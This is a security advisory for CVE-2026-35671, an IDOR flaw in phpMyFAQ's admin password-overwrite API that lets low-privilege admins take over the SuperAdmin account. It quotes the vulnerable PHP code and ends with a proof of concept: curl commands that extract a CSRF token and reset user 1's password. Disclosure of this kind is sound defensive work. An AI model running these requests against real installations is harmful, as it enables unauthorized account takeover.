# [H] phpMyFAQ: IDOR Account Takeover 

## Summary
Severity: High
Advisory: GHSA-xvp4-phqj-cjr3
CVE: CVE-2026-35671
CWE: CWE-266, CWE-269, CWE-639, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-20
Source: https://github.com/advisories/GHSA-xvp4-phqj-cjr3
Type: github-advisory

## Affected
- Packagist: `thorsten/phpmyfaq` — affected >=0 <4.1.3
- Packagist: `phpmyfaq/phpmyfaq` — affected >=0 <4.1.3

## Details
### Summary
An Insecure Direct Object Reference (IDOR) vulnerability in phpMyFAQ's Admin API allows any authenticated administrator to change the password of any user account, including SuperAdmin accounts (userId=1), without authorization verification. An attacker with a low-privilege admin account can escalate privileges to full SuperAdmin control by simply changing the target user's ID in the API request body.

### Details
File: phpmyfaq/src/phpMyFAQ/Controller/Administration/Api/UserController.php
Lines: 232-271
The overwritePassword() method at line 232 accepts PUT requests to /admin/api/user/overwrite-password:
#[Route(path: 'user/overwrite-password', name: 'admin.api.user.overwrite-password', methods: ['PUT'])]
```php
public function overwritePassword(Request $request): JsonResponse
{
    $this->userHasUserPermission();  // Only checks if user has USER_EDIT permission
    $currentUser = CurrentUser::getCurrentUser($this->configuration);
    $data = json_decode($request->getContent());
    $userId = Filter::filterVar($data->userId, FILTER_VALIDATE_INT);  // User-controlled!
    $csrfToken = Filter::filterVar($data->csrf, FILTER_SANITIZE_SPECIAL_CHARS);
    $newPassword = Filter::filterVar($data->newPassword, FILTER_SANITIZE_SPECIAL_CHARS);
    $retypedPassword = Filter::filterVar($data->passwordRepeat, FILTER_SANITIZE_SPECIAL_CHARS);
    if (!Token::getInstance($this->session)->verifyToken(page: 'overwrite-password', requestToken: $csrfToken)) {
        return $this->json(['error' => ...], Response::HTTP_UNAUTHORIZED);
    }
    // NO check that $userId belongs to a user the admin should manage
    // NO check that target user has lower or equal privileges
    // Can overwrite password for ANY user, including SuperAdmin (userId=1)
    $currentUser->getUserById((int) $userId, allowBlockedUsers: true);
    $authSource->getEncryptionContainer($currentUser->getAuthData(key: 'encType'));
    if (hash_equals($newPassword, $retypedPassword)) {
        if (!$currentUser->changePassword($newPassword)) {
            return $this->json(['error' => ...], Response::HTTP_BAD_REQUEST);
        }
        $this->adminLog->log($this->currentUser, AdminLogType::USER_CHANGE_PASSWORD->value . ':' . $userId);
        return $this->json(['success' => ...], Response::HTTP_OK);
    }
}
```

### Root Causes:
1. No verification that the requesting admin has permission to modify the target user's password
2. No check that the target user has equal or lower privilege level
3. The userId is taken directly from the request body without authorization context
4. No multi-factor confirmation for privilege-escalating password changes


### PoC

Prerequisites: Authenticated admin session with USER_EDIT permission

Step 1 - Obtain Admin Session:
Log in as a low-privilege admin user (or exploit CVE-2026-XXXX-1 to take over any user first).

Step 2 - Extract CSRF Token:
CSRF token is embedded in admin pages:
```bash
curl -sL -b "PHPSESSID=admin_session" http://target/admin/index.php | grep -oP 'pmf-csrf-token.*?value="\K[^"]+'
```

Step 3 - Change SuperAdmin Password:
```bash
curl -X PUT -H "Content-Type: application/json" \
  -b "PHPSESSID=admin_session" \
  -d '{
    "userId": 1,
    "csrf": "admin_csrf_token_value",
    "newPassword": "NewSuperAdminP@ss123!",
    "passwordRepeat": "NewSuperAdminP@ss123!"
  }' \
  http://target/admin/api/user/overwrite-password
```

Response: {"success":"The password was successfully changed."}

Step 4 - Account Takeover:
Attacker now has SuperAdmin credentials and full control of phpMyFAQ.

### Who is Impacted:
- Organizations with multiple admin users where not all should have SuperAdmin access
- Any phpMyFAQ instance where privilege separation is configured
- Multi-tenant environments where users should only manage their own accounts

#### Attack Complexity: Low - only requires a valid admin session with USER_EDIT permission
#### Privilege Escalation: Any admin user can become SuperAdmin regardless of their assigned permissions

## References
- https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-xvp4-phqj-cjr3
- https://github.com/thorsten/phpMyFAQ
